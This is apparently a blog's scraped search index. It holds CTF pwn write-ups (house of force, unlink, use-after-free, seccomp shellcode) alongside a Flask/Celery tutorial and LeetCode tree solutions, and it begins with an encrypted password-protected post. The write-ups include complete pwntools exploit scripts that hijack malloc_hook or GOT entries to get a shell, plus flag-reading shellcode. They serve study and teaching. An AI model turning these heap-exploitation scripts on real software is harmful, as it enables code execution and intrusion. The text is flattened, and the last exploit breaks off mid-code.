1c045e06408d6fbd8f3f78ec21bcd09daff96674b81ade1a9cced0ce12025c7f63ee9d8428e25eecb3c2c1d53e37ac0072b728b2afb103ef5c44ddff3a0b5c6f0adb6c28ed0ce48e955e5a801274ca4c85a732e77758028d61face50493e859cb60445782a7d50a5e17eef78ddfc276f669a61fe3a5d0a0c9f4ac2f13241ccaa32c4709c8db3c215d2078f55e493559a7f0833a1593d49bc8ea5265df3e2ec9e663d6c72470e6339233f02f89e64a0d01a390dedc4b8b9f79d9c5ea2fae3f547014dee7e44fdd965faa8fe5793f2464633c6a676841aa7f3ca5e6884a0e32542522a0eba194ea13db43378e449711f10c5d5950ea0f6d228e6cedb99884cab3ff73b1dc81450eeb7720f4f0dfcd8482674ad1a280711350f0235af6ce66e8d6033c8932871e33bb3b6fb1e50ed98e98b28595a73ed4ebbf534b73b7a99a33db6e8fe44cc3510ba3eeef109f98e5443bfcd05bd3e60eedd70093f0132c492045effb672fe71befd1863e2867803ad01ce87c15e4eec5da98ba9a720f7ba3ae4efa782b7bdaa5bea316ba903ffcbeb3be27ee47d9c1db5684a7ef86c7e261022867983298c8d63a12ced7b51714e5964e8dcfcb931320661b1bd6a1819046192d0cd190a4dca27444263b36320b2640cf125657e58072c3b5c2aea0eef080d3331cb9664e927f097ba0fef82bebbf1f3c2c460f1f1e35a8fda0bf085f039d8cc0d2cf57ed2fd8984606d067d82d3aea531869e5f18ce0475eb7b15c208662179e029da64a15bd6290024d7d5eef80517ab89cbfa76aa3484a3dbdf86b42ea9e87e358cf7a92e48b34b9c1017a6836d05006455eee4d205c28b141d47966b2db772fb5c3dd1373d1816f1e8e81e4390dd97b298d1164181b2a6d8f448dd1bbe6808ac05aec4411d06e83d564dae5bb40f88c603fa9c5fb16b6d149e972845a69452d5cac15c815d40221e4ac28d3f029c4d81672f4518a43ae199c89424396069bfca977dc26120265766cb99e433013f54610d5df2401c2c51f3a6c4cfe96b5790b3b6d8a3bdf154d81875d4fe7b7abcc0aaff6bc1270713eb16536370364fca482df7d97b5d99f51a81d12d2c1df0f1653ce3014ebc01237d208d000b86769b10d0176970aee88f7dcaf2b3f425763440727b0d748243047231156f4cc0e47843295be4822ba25cd1f33639d045da54d3475e245e2b89fe74c8d517c044f146d61444e76ab6c29a49523cdd1ec1bb6cbb14c39fbf1895cb87114422b9f9b497447869ff6cb35ada6f2892442b54c02b4e0bf45f2d035f946ec930bcb580584118a1338b18a01865e507d9aaef3eec3686b77ebec6cff1d98261f5618003a8ddf17e955657622d62f93d9c7d5c6b18d3b66d0e2a2dee742985220a4b49a40720f433ad0c35ee257adf8d2367290034e759a87f8f8fc541ade18d2eaeddbc7f4e56828488c85a710717e78785bdd2ebdd491a52fa2ed99df75a7b2d2b27d2c5181d82b8c3a033256a7df8dadc82047556f582946872f907b9db7f8169393791aded7c0f769c174d813c90483baf0a558297b048bf848f23d0bae7cd75db6e378b0ac559c973ecfbb2a3b31e53862fe92b788e39894cfae2507180617a7fc683f1f0c6219da21eb5b6c56f1ac589c45cd5f8d1e1144c9a7345c8ac13f4d921ebe80dff578aa30415f3231ee9e2e7e3ce42527c7df5ae8c5dbb76643020b36d328a28305a3ce8d7d743a6dd8c535f91795598f0e22624dd0b9e672343045982c6433b1a86d2fdd7e3d04dd0b05404af1a0a9ecdc48747423796658659356d7c688d3f9379349c500f048f0a1798cbcba83edb4e7002e8f032b7eb612221496c24adaa725b48454600637a6022cc1671c055a2295833e22da054abb0ceb3bcd62020767919a6e3281659294a2f602cce101d0107716f161f36b3fd96f9f616d7a9956410623f587ac57d06e0257159f4c9623784df07d50ccf66cc69b72377bbfbc46cf35bbf14a658d391fcfc59a56689560309dcf1202f2e2ca0123c9c62357d15dd7ec8673426cf0fe9d69f3243d3259fa9b Pease input your password","link":"/2021/12/26/diary/"},{"title":"gyctf_2020_force","text":"house of force,realloc 调整栈帧 # 思路 house of force 改 top chunk，劫持 malloc_hook 为 one_gadget 拿 shell # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758from pwn import *# r = remote(&quot;node4.buuoj.cn&quot;, 26964)r = process(&quot;./gyctf_2020_force&quot;)context.log_level = 'debug'elf = ELF(&quot;./gyctf_2020_force&quot;)libc = ELF('./libc-2.23.so')one_gadget_16 = [0x45216,0x4526a,0xf02a4,0xf1147]def add(size, content): r.recvuntil(&quot;2:puts\\n&quot;) r.sendline('1') r.recvuntil(&quot;size\\n&quot;) r.sendline(str(size)) r.recvuntil(&quot;bin addr &quot;) addr = int(r.recvuntil('\\n').strip(), 16) r.recvuntil(&quot;content\\n&quot;) r.send(content) return addrdef show(index): r.recvuntil(&quot;2:puts\\n&quot;) r.sendline('2')libc.address = add(0x200000, 'chunk0\\n') + 0x200ff0success('libc_base'+hex(libc.address))heap_addr = add(0x18, 'a'*0x10+p64(0)+p64(0xFFFFFFFFFFFFFFFF))success(&quot;heap_addr:&quot;+hex(heap_addr))top = heap_addr + 0x10# gdb.attach(r)malloc_hook = libc.sym['__malloc_hook']success(&quot;malloc_hook&quot;+hex(malloc_hook))one_gadget = one_gadget_16[1] + libc.addressrealloc = libc.sym[&quot;__libc_realloc&quot;]offset = malloc_hook - topsystem = libc.sym['system']bin_sh = libc.search('/bin/sh').next()success(&quot;system:&quot; + hex(system))success(&quot;bin_sh&quot; + hex(bin_sh))add(offset-0x30, 'aaa\\n')add(0x10, 'a'*8+p64(one_gadget)+p64(realloc+0x10))r.recvuntil(&quot;2:puts\\n&quot;)r.sendline('1')r.recvuntil(&quot;size\\n&quot;)r.sendline(str(20))r.interactive()","link":"/2022/02/27/gyctf_2020_force/"},{"title":"flask配置celery异步任务","text":"flask 配置 celery 异步任务 # 前言# 转载自：https://www.cnblogs.com/wxhou/p/14399237.html 在使用 flask 开发的时候，接口的返回需要很少的时间，所以我们需要将一些耗时的任务，放到异步后台去处理，例如：发送邮件，耗时的 CPU 任务等。在 python web 框架中 celery 这个库，可能是最合适的。 由于我使用 flask 的时间比较多，但是当我想把 celery 很好的与 flask 进行集成的时候，却发现并不是那么如意。花费了很久的时间去实践最后却是各种报错。出现了循环导入、app 上下文、tasks not found 等问题，尝试了种种却总是不如人意。 好在功夫不负有心人，在结合官方文档并查阅了大量资料后，终于把 celery 很好得集成在了 flask 项目中。我在这里记录一下，同时也希望对你们有所帮助。 # 配置# 开发环境 Windows10 python 3.8.6 flask 2.0.x celery 5.x broker redis pool eventlet # simple 模式# 由于 celery 5.0 后推荐小写模式，与 flask config 大写规范有冲突，所以我们当同目录下创建一个 celeryconfig.py 文件 123celeryconfig.pybroker_url='redis://127.0.0.1:6379/1'result_backend='redis://127.0.0.1:6379/2' flask simple 模式。 12345678910111213141516171819202122232425simple.pyfrom flask import Flaskfrom celery import Celeryimport celeryconfigapp = Flask(__name__)celery_app = Celery(app.import_name, broker=celeryconfig.broker_url, backend=celeryconfig.result_backend)celery_app.config_from_object(celeryconfig)@celery_app.task(name='simple/add2')def add2(x, y): return x + y@app.route('/')def index(): results = add2.delay(3, 5) return str(results.wait())if __name__ == '__main__': app.run(debug=True) 这些就是单文件模式的代码，这其中我们添加了一个任务 add2 ，然后启动 flask。 1python simple.py 由于 celery 和 flask 是同级别的 app，所以我们需要一个新的窗口启动 celery，加入 - P 参数指定异步 worker eventlet 1celery -A simple.celery_app worker -l info -P eventlet 当我们启动 celery 之后。看到最后一行的 ready 的时候，说明我们的 celery 已经启动成功了。 然后再看有下面标识说明我们的任务已经被添加成功了。 12[tasks] . simple/add2 访问网址：http://127.0.0.1:5000/ 同时我们查看一下 celery 的窗口： simple 模式就结束了 # Factory 模式# 当然我们如果用 flask 写一个稍微复杂的东西的话，其实工厂模式我们应该用的更多。下面我们一起来看看工厂模式中的配置。 # 目录结构# 首先我们先规划一个 flask+celery 的目录结构。然后创建下面的文件： 1234567891011.├── app│ ├── __init__.py ——app主体文件│ ├── celeryconfig.py ——celery配置文件│ ├── config.py ——flask配置文件│ ├── models.py ——模型文件│ ├── tasks.py ——后台任务│ └── views.py ——视图文件├── data.db├── .flaskenv ——flask环境变量└── server.py ——运行文件 我们先创建一个注册 celery 的函数，主要功能是使用 flask 应用上下文。 123456789def register_celery(celery, app): class ContextTask(celery.Task): abstract = True def __call__(self, *args, **kwargs): with app.app_context(): return self.run(*args, **kwargs) celery.Task = ContextTask 然后我们创建 create_app 函数，将写好的注册 celery 函数加进去。 12345678def create_app(**kwargs): app = Flask(__name__) app.config.from_pyfile('config.py') db.init_app(app) register_celery(celery=kwargs.get('celery'), app=app) # &gt;&gt; 注册celery register_blueprints(app) register_commands(app) return app 上面这些都是我们在 __init__ 文件中创建的，下面我们来创建 celery 的 app 打开 server.py 123456789101112131415from celery import Celeryfrom app import create_app, celeryconfigdef make_celery(app_name): celery = Celery(app_name, broker=celeryconfig.broker_url, backend=celeryconfig.result_backend) celery.config_from_object(celeryconfig) return celerymy_celery = make_celery(__name__)app = create_app(celery=my_celery) 我们把 celery 配置文件和 flask 工厂应用导入进来。然后创建 make_celery 函数生成 celery 应用。 生成 celery 应用后把 celery 传入到 flask 应用函数中去。这样把生成和注册分开写，解决了循环导入的问题。 接着我们创建一个 tasks.py 文件。 12345678910from server import my_celeryfrom .models import db, Message@my_celery.task()def add2(msg): message = Message(details=msg) db.session.add(message) db.session.commit() return &quot;success&quot; 从 server 文件中导入 celery 应用，然后创建任务。 然后在视图中引用任务。 1234567891011121314151617181920from flask import Blueprint, jsonifyfrom .models import db, Messagefrom .tasks import add2th = Blueprint('', __name__)@th.route('/')def index(): res = add2.delay(&quot;hello word&quot;) return jsonify(res.wait())@th.get('/msgs')def msg_list(): messages = Message.query.all() results = [] for message in messages: results.append(message.to_json()) return jsonify(results) celery 的任务可以通过 delay， 方法调用，参数在 delay 中直接传入。 详细介绍： # celery 文档# 这些 API 定义了标准的执行选项集，也就是下面这三个方法： apply_async(args[, kwargs[, …]]) 发送一个任务消息。 delay(*args, **kwargs) 直接发送一个任务消息，但是不支持运行参数。 calling( __call__ ) 应用一个支持调用接口（例如，add (2,2)）的对象，意味着任务不会被一个 worker 执行，但是会在当前线程中执行 (但是消息不会被发送)。 速查表 T.delay(arg, kwarg=value) 调用 apply_async 的快捷方式（.delay (_args, *_kwargs) 等价于调用 .apply_async (args, kwargs)）。 T.apply_async((arg,), {'kwarg': value}) T.apply_async(countdown=10) 从现在起，十秒内执行。 T.apply_async(eta=now + timedelta(seconds=10)) 从现在起十秒内执行，指明使用 eta。 T.apply_async(countdown=60, expires=120) 从现在起一分钟执行，但在两分钟后过期。 T.apply_async(expires=now + timedelta(days=2)) 两天内过期，使用 datetime 对象。 例子 delay() 方法就像一个很规则的函数，很方便去调用它： 1task.delay(arg1, arg2, kwarg1='x', kwarg2='y') 用 apply_async() 替代你写的： 1task.apply_async(args=[arg1, arg2], kwargs={'kwarg1': 'x', 'kwarg2': 'y'}) 尽管运行十分方便，但是如果像设置额外的行参数，你必须用 apply_async # 运行一下# 运行之前我们需要先创建一个 .flaskenv 文件，指定以下我们的 FLASK_APP 环境变量是 server.py 1FLASK_APP=server.py 好了之后，启动 flask 1flask run 启动 celery 1celery -A server.my_celery worker -l info -P eventlet 老规矩，看一下任务注册成功没 12[tasks] . app.tasks.add2 我们打开浏览器查看 可以看到执行成功了。再看看命令行。 任务已经成功的执行了。 就这样我们弄好了 flask+celery 项目的配置，并成功执行了任务。 （待补充 django+celery)","link":"/2022/02/13/flask%E9%85%8D%E7%BD%AE%E5%BC%82%E6%AD%A5%E4%BB%BB%E5%8A%A1/"},{"title":"jarvisoj_level6_x64","text":"double free，unlink 覆写 got 表 # 0x01 程序分析 主函数： 之后 sub_400A49：用户初始堆分配 sub_400998：要求输入一个操作选项 sub_400B14：遍历索引打印所有标号和记录内容 sub_400BC2: 要求输入记录的内容长度和记录内容，然后检测输入长度是否超过最大值，正常则 malloc 一个堆块用来存储记录，然后按输入的长度读取记录内容到堆块： sub_400D87：编辑，是一个 realloc，可以泄露堆溢出 堆 v2 也就是 size 进行了要求，在最后的 sub_40085D 函数中进行了内容读取，这里没有将字符串结束符读进来因此可以进行内存泄露，泄露偏移和 system 地址。 sub_400f7d：删除功能，依据标号找到相应的记录然后重置索引表为未使用态并 free 掉堆块，存在 double free 漏洞 unlink 思路 利用 unsorted bin 的 fd 指针分别泄露出 heap 地址和 libc 地址，这样就得到了最初那个 0x1820 大小的 chunk 的地址 利用 realloc 功能来构造 unlink 条件，结合 uaf 漏洞，修改某个 ptr 为 ptr - 0x18 ，这个 ptr 在 0x1820 堆块上 利用 edit 修改 atoi@got 为 system 地址 输入 /bin/sh 拿 shell # 0x02 漏洞利用 添加四个 Note，释放 note [0] 和 note [2]，此时 note [0] 的 bk 指向 note [2] 的 chunk，note [2] 的 bk 指向 main_arena+0x58（两个 chunk 都进入 unsorted bin） 再次添加 2 个 note，payload 长度为 8，注意结尾不要是 \\x00 利用 list 泄露 NOTE 管理块的地址和 libc 基地址 将四个 note 全部删除 添加一个 note，长度要能包含进最开始的 3 个 note 的 chunk 伪造一个 chunk，大小为 0x80，fd 为 note [0]-0x18， bk 为 note [0]-0x10，利用 unlink 把 NOTE 管理块中 note [0] 的地址改为 note [0]-0x18 把 note [0] 改为 atoi 的 got，然后编辑 note [0]，改为 system 地址 输入 /bin/sh，获取 shell 先申请 4 个 chunk，然后 free (0) 和 free (2)，防止合并；然后在申请 2 个 chunk，只写入 8 字节，就可以 leak 出 heap 和 libc 的基地址； 在 heap 基地址偏移 0x30 的地方有我们需要的 NOTE 管理块的地址 # 0x03 EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175#!/usr/bin/env python# -*- coding: utf-8 -*-from pwn import *context.log_level = 'debug'p=process('./freenote_x64')# p=remote('node4.buuoj.cn',28735)libc=ELF('libc-2.23.so')e=ELF('./freenote_x64')def List(): p.recvuntil('Your choice: ') p.sendline('1')def new(cont): p.recvuntil('Your choice: ') p.sendline('2') p.recvuntil('Length of new note: ') p.sendline(str(len(cont))) p.recvuntil('Enter your note: ') p.sendline(cont)def edit(num,cont): p.recvuntil('Your choice: ') p.sendline('3') p.recvuntil('Note number: ') p.sendline(str(num)) p.recvuntil('Length of note: ') p.sendline(str(len(cont))) p.recvuntil('Enter your note: ') p.sendline(cont)def delete(num): p.recvuntil('Your choice: ') p.sendline('4') p.recvuntil('Note number: ') p.sendline(str(num))new('a'*0x80)new('b'*0x80)new('c'*0x80)new('d'*0x80)delete(0)delete(2)new('11111111')new('22222222')List()p.recvuntil('11111111')s=p.recvuntil('\\x0a')chunk2=u64(s[:-1].ljust(8,'\\x00'))heap_addr=chunk2-0x1940point_chunk0=heap_addr+0x30print hex(heap_addr)delete(1)delete(2)delete(3)#unlinkpayload = p64(0x90)+p64(0x81)+p64(point_chunk0-0x18)+p64(point_chunk0-0x10) payload +='a'*0x60payload += p64(0x80)+p64(0x90)payload +='c'*0x80+p64(0x90)+p64(0x121)edit(0,payload)delete(1)#free_got-&gt;systemfree_got_addr=e.got['free']print hex(free_got_addr)payload2=p64(4)+p64(1)+p64(0x8)+p64(free_got_addr)payload2+=p64(1)+p64(0x8)+p64(chunk2)payload2+=p64(1)+p64(0x8)+p64(e.got['atoi'])payload2+='\\x00'*(0x120-80)edit(0,payload2)p.recvuntil('Your choice: Invalid!\\n')List()p.recvuntil('2. ')atoi_in_server=u64(p.recvuntil('\\x0a')[:-1].ljust(8,'\\x00'))system_in_server=libc.symbols['system']+atoi_in_server-libc.symbols['atoi']#gdb.attach(proc.pidof(p)[0])payload3=p64(system_in_server)edit(0,payload3)edit(1,&quot;/bin/sh\\x00&quot;)delete(1)p.interactive() # 0x04 参考文章 https://blog.csdn.net/weixin_45427676/article/details/105495608 https://www.cnblogs.com/LynneHuan/p/14869403.html","link":"/2022/01/13/jarvisoj_level6_x64/"},{"title":"hitcontraining_unlink","text":"ulink # hitcontraining_unlink # 程序分析 检查：64 位程序，开了 NX 和 canary 存在 magic 函数（实际上并没什么用） 查看主函数及各菜单功能 show() add() change() 在 change_item () 函数中并没有对输入的内容 size 进行检查，存在堆溢出 remove() # 思路 unlink 基本知识 新版 unlink 要求 // 由于 P 已经在双向链表中，所以有两个地方记录其大小，所以检查一下其大小是否一致 (size 检查) if (__builtin_expect (chunksize§ != prev_size (next_chunk§), 0)) malloc_printerr (“corrupted size vs. prev_size”); \\ // 检查 fd 和 bk 指针 (双向链表完整性检查) if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)) malloc_printerr (check_action, “corrupted double-linked list”, P, AV); \\ //largebin 中 next_size 双向链表完整性检查 if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0) || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0)) malloc_printerr (check_action, “corrupted double-linked list (not small)”, P, AV); 利用思路： 构造 fake_chunk 通过 unlink，把 chunk 移到存储 chunk 指针的内存处 覆盖 chunk 0 指针为 atoi@got 表地址并泄露 覆盖 atoi 的 got 表为 system 函数地址。 给出参数 ‘/bin/sh’，调用 atoi 函数拿 shell。 # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667#coding:utf-8from pwn import *context.log_level = 'debug'r = remote('node4.buuoj.cn',27663)# r=process('./bamboobox')elf = ELF('./bamboobox')libc = ELF('./libc-2.23.so')def add(length,name): r.recvuntil(&quot;:&quot;) r.sendline('2') r.recvuntil(':') r.sendline(str(length)) r.recvuntil(&quot;:&quot;) r.sendline(name) def edit(idx,length,name): r.recvuntil(':') r.sendline('3') r.recvuntil(&quot;:&quot;) r.sendline(str(idx)) r.recvuntil(&quot;:&quot;) r.sendline(str(length)) r.recvuntil(':') r.sendline(name) def delete(idx): r.recvuntil(&quot;:&quot;) r.sendline(&quot;4&quot;) r.recvuntil(&quot;:&quot;) r.sendline(str(idx)) def show(): r.recvuntil(&quot;:&quot;) r.sendline(&quot;1&quot;)add(0x40,'aaaaaaaa')add(0x80,'bbbbbbbb')add(0x80,'cccccccc')#gdb.attach(r)ptr = 0x6020C8 #存放chunk指针的数组在bss段上的地址#这里我们绕过第一个检查 (检查p和其前后的chunk是否构成双向链表)fake_chunk = p64(0) + p64(0x41) #fake_chunk headerfake_chunk += p64(ptr-0x18) + p64(ptr-0x10) #fake_chunk fd bkfake_chunk += 'C'*0x20fake_chunk += p64(0x40) # 1的presize fake_chunk += p64(0x90) # 1的sizeedit(0,0x80,fake_chunk)delete(1) #前向合并，合并0中的fake_chunk 放入 unsorted bin 中 ,同时 ptr = &amp;itemlist0_ptr -0x18payload = p64(0) * 2payload += p64(0x40) + p64(elf.got['atoi']) #覆盖的itemlist[0]-&gt;ptr 为atoi_gotedit(0,0x80,payload)show()r.recvuntil('0 : ')atoi = u64(r.recv(6).ljust(8,'\\x00'))libc_base = atoi - libc.symbols['atoi']system = libc_base + libc.symbols['system']edit(0,8,p64(system))r.sendlineafter('Your choice:','/bin/sh\\x00')r.interactive() # 参考文章 https://blog.csdn.net/mcmuyanga/article/details/113105091","link":"/2022/01/19/hitcontraining_unlink/"},{"title":"堆漏洞uaf","text":"uaf # 知识点 UAF 漏洞全称为 use after free，即释放后重用。漏洞产生的原因，在于内存在被释放后，但是指向指针并没有被删除，又被程序调用。比较常见的类型是 C 对象，利用 UAF 修改 C 的虚函数表导致的任意代码执行。 # 例题 # [BUUCTF]PWN——hitcontraining_uaf checksec 检查，开了 NX 保护，32 位 (1) add note add 会申请两次内存，第一次申请 8 个字节，前四个字节指向 print_note_content 这个函数，后四个字节指向我们写入的字符串 (count 会加 1) (2) delete note 只释放了堆块里的内容但没有将指针置 0，存在 uaf 漏洞，并未指向 NULL (3) print note 调用 add 申请的第一个 8 个字节中的前四个字节指向的函数，打印 add 创建的第二个 chunk 里的值 （4） shell fastbin 是单向链表遵循先进后出原则，申请 A,B 两个堆块后，先释放 A ，后释放 B，会在 fastbin 里形成链，此时，再次申请一个大小为 0x8 的内存 C，并写入 shellcode 地址，那么第一个 8 个字节 C 就指向 B，第二个 8 个字节 C 指向 A，这时候我们写入的内容就会覆盖原有的，但原来的指针仍指向它，因而可以更改 print_note_content 函数为我们想要执行的函数。 在 add 中，我们只能对 content 部分进行操作，无法对 print_note_content 对应的部分即 put 段进行操作，所以我们要想办法，操作 put 段 1根据put段和content段中大小的不同，如果要申请到put段，payload大小应该为0x8，由于先进后出原则，先释放A，后释放B，此时第三次申请的put段指向B的put，content段指向A的put，content写入magic，调用print_note(0)时就调用了magic 申请过程堆块变化： add: free 后： 再次申请，写入 shell 先进后出原则 wp: 1234567891011121314151617181920212223242526272829303132333435363738from pwn import *r = process('./hacknote')# r = remote('node4.buuoj.cn',27609)shell_add = 0x8048945def add(size,content): r.sendlineafter('choice :','1') r.sendlineafter('Note size :',str(size)) r.sendlineafter('Content :',content)def delete(idx): r.sendlineafter('choice :','2') r.sendlineafter('Index :',str(idx))def printf(idx): r.sendlineafter('choice :','3') r.sendlineafter('Index :',str(idx))add(48,'aaaa')add(48,'bbbb')#gdb.attach(r)delete(0)delete(1)add(8,p32(shell_add))printf(0)#第二种思路double free#add(8,'aaaa')#delete(0)#delete(0)#add(40,'aaaa')#add(8,p32(shell_addr))#printf(1)r.interactive() # 参考文章 https://blog.csdn.net/mcmuyanga/article/details/108454183?ops_request_misc=%7B%22request%5Fid%22%3A%22163714805316780261940769%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=163714805316780261940769&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2allsobaiduend~default-2-108454183.first_rank_v2_pc_rank_v29&amp;utm_term=hitcontraining_uaf&amp;spm=1018.2226.3001.4187 IE 漏洞学习笔记（二）：UAF 释放后重用 One_gadget 和 UAF 结合利用堆溢出漏洞研究","link":"/2021/11/17/hitcontraining_uaf/"},{"title":"leetcode数据结构刷题（二）","text":"二叉搜索树相关 # 0x01 二叉树最底层最左边的值 给定一个二叉树的 根节点 root ，请找出该二叉树的 最底层 最左边 节点的值。 假设二叉树中至少有一个节点。 12输入: [1,2,3,4,null,5,6,null,null,7]输出: 7 # 法一：前序遍历 DFS 使用 DFS 递归遍历树的所有节点，记录当前节点的层级 level 与已遍历节点的最大层级 maxLevel 每当 level 超过 maxLevel 时，将当前节点赋值给 res，另外更新 maxLevel 遍历完成后，res 就是要找的节点，返回该节点的值即可 遍历到新的一层的第一个节点为最底层，最左边的节点 12345678910111213141516171819class Solution {public: int res = 0; int maxlevel=-1; int findBottomLeftValue(TreeNode* root) { dfs(root,0); return res; } void dfs(TreeNode * root,int level){ if(root==NULL) return ; if(level&gt;maxlevel){ res = root-&gt;val; maxlevel = level; } dfs(root-&gt;left,level+1); dfs(root-&gt;right,level+1); } }; # 法二：层序遍历 BFS 更新每层第一个元素值，取最后一次更新值 12345678910111213141516171819202122232425262728293031/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */class Solution {public: int findBottomLeftValue(TreeNode* root) { queue&lt;TreeNode*&gt; q; q.push(root); int leftnode; while(!q.empty()){ int size = q.size(); for (int i=size;i;i--){ auto node = q.front(); if(i==size) leftnode = node-&gt;val; q.pop(); if(node-&gt;left) q.push(node-&gt;left); if(node-&gt;right) q.push(node-&gt;right); } } return leftnode; }}; # 0x02 往完全二叉树添加节点 完全二叉树是每一层（除最后一层外）都是完全填充（即，节点数达到最大，第 n 层有 2n-1 个节点）的，并且所有的节点都尽可能地集中在左侧。 设计一个用完全二叉树初始化的数据结构 CBTInserter，它支持以下几种操作： CBTInserter (TreeNode root) 使用根节点为 root 的给定树初始化该数据结构； CBTInserter.insert (int v) 向树中插入一个新节点，节点类型为 TreeNode，值为 v 。使树保持完全二叉树的状态，并返回插入的新节点的父节点的值； CBTInserter.get_root () 将返回树的根节点。 示例 1： 123456输入：inputs = [&quot;CBTInserter&quot;,&quot;insert&quot;,&quot;get_root&quot;], inputs = [[[1]],[2],[]]输出：[null,1,[1,2]]输入：inputs = [&quot;CBTInserter&quot;,&quot;insert&quot;,&quot;insert&quot;,&quot;get_root&quot;], inputs = [[[1,2,3,4,5,6]],[7],[8],[]]输出：[null,3,4,[1,2,3,4,5,6,7,8]] # 使用队列完成二叉树的层序遍历 通过观察可以发现新节点需要插入层次遍历时第一个出现的 “不完整的节点” （即不同时具有左右孩子节点）。如图中所示，绿色代表当前队列中的节点（规定节点的左右孩子均存在时才将它们一起先后压入队列)，当遍历到 “不完整的节点” 就找到了新节点插入的节点位置，“不完整的节点” 位于队列的头部。在 CBTInserter 函数中实现该过程，找到插入的位置，以及得到当前的队列。 插入操作时，先后检查队列头部节点的左右孩子，若左孩子缺失则将新节点插入其左孩子，右孩子缺失则插入右孩子。当队列头部节点的左右孩子都存在，则将其左右孩子压入队列尾部，队列的头部节点出队列，因为此时它已不是 “不完整的节点” 。更新后的队列的头部节点将是下一个 “不完整的节点”。按照规则依次处理接下来的插入操作。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253/** * Definition for a binary tree node. * struct TreeNode { * int val; * TreeNode *left; * TreeNode *right; * TreeNode() : val(0), left(nullptr), right(nullptr) {} * TreeNode(int x) : val(x), left(nullptr), right(nullptr) {} * TreeNode(int x, TreeNode *left, TreeNode *right) : val(x), left(left), right(right) {} * }; */class CBTInserter {private: queue&lt;TreeNode*&gt; que; TreeNode* root;public: CBTInserter(TreeNode* root) { this-&gt;root = root; que.push(root); while (que.front()-&gt;left != nullptr &amp;&amp; que.front()-&gt;right != nullptr) { que.push(que.front()-&gt;left); que.push(que.front()-&gt;right); que.pop(); } } int insert(int v) { TreeNode* node = new TreeNode(v); TreeNode* fa = que.front(); if (fa-&gt;left == nullptr) { fa-&gt;left = node; } else { fa-&gt;right = node; que.push(fa-&gt;left); que.push(fa-&gt;right); que.pop(); } return fa-&gt;val; } TreeNode* get_root() { return this-&gt;root; }};/** * Your CBTInserter object will be instantiated and called as such: * CBTInserter* obj = new CBTInserter(root); * int param_1 = obj-&gt;insert(v); * TreeNode* param_2 = obj-&gt;get_root(); */ 时间复杂度为 O (n)，队列中存的节点数为 O (n)，所以空间复杂度为 O (n)。","link":"/2022/01/30/leetcode%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95(%E4%BA%8C%EF%BC%89/"},{"title":"pwnable.tw orw","text":"prctl 内核沙箱机制 # 知识点 prctl seccomp 相当于内核中的一种安全机制，正常情况下，程序可以使用所有的 syscall，但是当劫持程序流程之后通过 exeve 来呼叫 syscall 得到 shell 时过滤掉某些 syscall，只允许使用部分 syscall。 seccomp 是 secure computing 的缩写，其是 Linux kernel 从 2.6.23 版本引入的一种简洁的 sandboxing 机制。在 Linux 系统里，大量的系统调用（system call）直接暴露给用户态程序。但是，并不是所有的系统调用都被需要，而且不安全的代码滥用系统调用会对系统造成安全威胁。seccomp 安全机制能使一个进程进入到一种 “安全” 运行模式，该模式下的进程只能调用 4 种系统调用（system call），即 read (), write (), exit () 和 sigreturn ()，否则进程便会被终止。 # WP 开启了 canary 本题系统内核只允许使用 sys_open，sys_read，sys_write 第一次调用 prctl 函数 禁止提权，第二次调用 prctl 函数 限制能执行的系统调用只有 open，write，exit 总体思路是：open flag -&gt;read-&gt;write sys_open 1234567push 0x0 #字符串结尾push 0x67616c66 #'flags'mov ebx,esp xor ecx,ecx #0xor edx,edx #0mov eax,0x5 #调用号int 0x80 #sys_open(flags,0,0) sys_read (2,file,0x100) 系统调用号为 3 123456mov eax,0x3; mov ecx,ebx; # ecx = char __user *buf 缓冲区，读出的数据--&gt;也就是读“flag”mov ebx,0x3; # 文件描述符 fd:是文件描述符 0 1 2 3 代表标准的输出输入和出错,其他打开的文件mov edx,0x100; #对应字节数int 0x80; sys_write (1,file,0x30) 系统调用号为 4 123mov eax,0x4; # eax = sys_writemov ebx,0x1; # ebx = unsigned int fd = 1int 0x80; exp: 1234567891011from pwn import *context(log_level = 'debug', arch = 'i386', os = 'linux')p=remote('node4.buuoj.cn',28836)shellcode=&quot;&quot;shellcode += asm('xor ecx,ecx;mov eax,0x5; push ecx;push 0x67616c66; mov ebx,esp;xor edx,edx;int 0x80;')shellcode += asm('mov eax,0x3;mov ecx,ebx;mov ebx,0x3;mov dl,0x30;int 0x80;')shellcode += asm('mov eax,0x4;mov bl,0x1;mov edx,0x30;int 0x80;')recv = p.recvuntil(':')p.sendline(shellcode)flag = p.recv(100)print flag 12345678910111213141516from pwn import *r = remote('node4.buuoj.cn',28836)context.log_level = 'debug'elf = ELF('orw')shellcode = shellcraft.open('/flag')shellcode += shellcraft.read('eax','esp',100)shellcode += shellcraft.write(1,'esp',100)shellcode = asm(shellcode)r.sendline(shellcode)r.interactive()","link":"/2021/11/17/pwnable.tw_orw/"},{"title":"unlink","text":"堆溢出漏洞 ——unlink 推荐 unlink 基本知识讲解 # 2014 HITCON stkof exp: 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586from pwn import *context.terminal = ['gnome-terminal', '-x', 'sh', '-c']if args['DEBUG']: context.log_level = 'debug'context.binary = &quot;./stkof&quot;hollkelf = ELF('./stkof')if args['REMOTE']: hollk = remote('127.0.0.1', 7777)else: hollk = process(&quot;./stkof&quot;)log.info('PID: ' + str(proc.pidof(hollk)[0]))libc = ELF('./libc.so.6')head = 0x602140def alloc(size): 